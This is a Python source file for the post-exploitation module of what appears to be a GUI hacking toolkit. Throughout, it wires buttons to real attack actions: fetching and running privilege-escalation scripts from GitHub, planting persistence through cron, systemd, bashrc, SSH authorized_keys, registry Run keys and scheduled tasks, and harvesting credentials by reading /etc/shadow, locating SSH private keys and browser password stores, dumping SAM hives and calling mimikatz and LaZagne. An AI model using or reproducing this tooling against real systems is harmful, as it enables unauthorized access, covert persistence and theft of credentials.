# language: Python, file: modules/post.py
import customtkinter as ctk
import threading
import subprocess
import os


class PostExploitModule:
    def __init__(self, log_queue):
        self.log = log_queue
        self.name = "post"

    def render(self, parent):
        ctk.CTkLabel(
            parent, text="POST-EXPLOITATION",
            font=ctk.CTkFont(size=18, weight="bold"), text_color="#00ff9c"
        ).pack(pady=(20, 4), padx=24, anchor="w")
        ctk.CTkLabel(
            parent, text="privesc · persistence · lateral movement · credential harvesting",
            font=ctk.CTkFont(size=11), text_color="#4a5568"
        ).pack(pady=(0, 16), padx=24, anchor="w")

        # privesc
        ctk.CTkLabel(parent, text="Privilege Escalation",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(8, 4), padx=24, anchor="w")
        row = ctk.CTkFrame(parent, fg_color="transparent")
        row.pack(fill="x", padx=24)
        for label, fn in [
            ("LinPEAS", lambda: self._fetch_run("linpeas")),
            ("WinPEAS", lambda: self._fetch_run("winpeas")),
            ("linux-exploit-suggester", lambda: self._fetch_run("les")),
            ("sudo -l", lambda: self._run_cmd("sudo -l")),
            ("SUID find", lambda: self._run_cmd(
                "find / -perm -4000 -type f 2>/dev/null")),
            ("cron check", lambda: self._run_cmd(
                "cat /etc/crontab; ls -la /etc/cron.*")),
        ]:
            ctk.CTkButton(row, text=label, width=160, height=32,
                          fg_color="#141a22", hover_color="#1a2332",
                          font=ctk.CTkFont(size=11), command=fn
                          ).pack(side="left", padx=(0, 6))

        # persistence
        ctk.CTkLabel(parent, text="Persistence",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(16, 4), padx=24, anchor="w")
        row2 = ctk.CTkFrame(parent, fg_color="transparent")
        row2.pack(fill="x", padx=24)
        for label, fn in [
            ("crontab @reboot", self._persist_cron),
            ("systemd service", self._persist_systemd),
            ("bashrc hook", self._persist_bashrc),
            ("SSH key", self._persist_ssh),
            ("Windows Run key", self._persist_reg),
            ("schtasks", self._persist_schtask),
        ]:
            ctk.CTkButton(row2, text=label, width=160, height=32,
                          fg_color="#141a22", hover_color="#1a2332",
                          font=ctk.CTkFont(size=11), command=fn
                          ).pack(side="left", padx=(0, 6))

        # cred harvesting
        ctk.CTkLabel(parent, text="Credential Harvesting",
                     font=ctk.CTkFont(size=13, weight="bold"),
                     text_color="#c8d6e5").pack(pady=(16, 4), padx=24, anchor="w")
        row3 = ctk.CTkFrame(parent, fg_color="transparent")
        row3.pack(fill="x", padx=24)
        for label, fn in [
            ("mimikatz", self._mimi),
            ("LaZagne", self._lazagne),
            ("SAM dump", self._sam),
            ("/etc/shadow", self._shadow),
            ("browser creds", self._browser),
            ("SSH keys", self._sshkeys),
        ]:
            ctk.CTkButton(row3, text=label, width=160, height=32,
                          fg_color="#141a22", hover_color="#1a2332",
                          font=ctk.CTkFont(size=11), command=fn
                          ).pack(side="left", padx=(0, 6))

        # custom command
        ctk.CTkLabel(parent, text="Custom command:",
                     font=ctk.CTkFont(size=11), text_color="#4a5568"
                     ).pack(pady=(20, 4), padx=24, anchor="w")
        self.cmd_entry = ctk.CTkEntry(
            parent, placeholder_text="shell command...", height=38,
            fg_color="#05080c", border_color="#1a2332"
        )
        self.cmd_entry.pack(fill="x", padx=24)
        self.cmd_entry.bind("<Return>", lambda e: self._run_cmd(self.cmd_entry.get()))
        ctk.CTkButton(
            parent, text="▸ EXEC", height=36,
            fg_color="#0d2818", hover_color="#1a4a2e",
            text_color="#00ff9c", command=lambda: self._run_cmd(self.cmd_entry.get())
        ).pack(pady=8, padx=24, anchor="w")

    def _run_cmd(self, cmd):
        if not cmd.strip():
            return
        self.log.put(f"[post] $ {cmd}")
        def run():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, text=True, bufsize=1)
                for line in p.stdout:
                    self.log.put(f"[out] {line.rstrip()}")
                p.wait()
            except Exception as e:
                self.log.put(f"[post] error: {e}")
        threading.Thread(target=run, daemon=True).start()

    def _fetch_run(self, tool):
        urls = {
            "linpeas": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh",
            "winpeas": "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe",
            "les": "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh",
        }
        url = urls[tool]
        self.log.put(f"[post] fetching {tool} from {url}")
        def run():
            out = f"/tmp/{tool}"
            subprocess.run(["curl", "-sL", url, "-o", out])
            os.chmod(out, 0o755)
            self._run_cmd(f"bash {out}" if tool in ("linpeas", "les") else out)
        threading.Thread(target=run, daemon=True).start()

    def _persist_cron(self):
        self._run_cmd("(crontab -l 2>/dev/null; echo '@reboot /tmp/payload') | crontab -")

    def _persist_systemd(self):
        svc = "[Unit]\nDescription=system\n[Service]\nExecStart=/tmp/payload\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"
        path = "/tmp/persist.service"
        with open(path, "w") as f:
            f.write(svc)
        self._run_cmd(f"cp {path} /etc/systemd/system/ 2>/dev/null && systemctl enable persist.service 2>/dev/null")

    def _persist_bashrc(self):
        self._run_cmd("echo '/tmp/payload &' >> ~/.bashrc")

    def _persist_ssh(self):
        self._run_cmd("mkdir -p ~/.ssh && echo 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys")

    def _persist_reg(self):
        self.log.put("[post] Windows registry Run key")
        self.log.put("[post] reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Sys /t REG_SZ /d C:\\payload.exe")

    def _persist_schtask(self):
        self.log.put("[post] schtasks /create /tn Sys /tr C:\\payload.exe /sc onlogon /rl highest")

    def _mimi(self):
        self.log.put("[post] mimikatz — run on target: privilege::debug; sekurlsa::logonpasswords")

    def _lazagne(self):
        self._run_cmd("python3 /opt/LaZagne/Linux/laZagne.py all 2>/dev/null || echo 'LaZagne not installed'")

    def _sam(self):
        self.log.put("[post] Windows: reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM sys.hiv")
        self.log.put("[post] then offline: secretsdump.py -sam sam.hiv -system sys.hiv LOCAL")

    def _shadow(self):
        self._run_cmd("cat /etc/shadow 2>/dev/null | head -20")

    def _browser(self):
        self._run_cmd("find ~/.config/google-chrome ~/.mozilla -name 'Login Data' -o -name 'logins.json' 2>/dev/null")

    def _sshkeys(self):
        self._run_cmd("find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null | head -20")
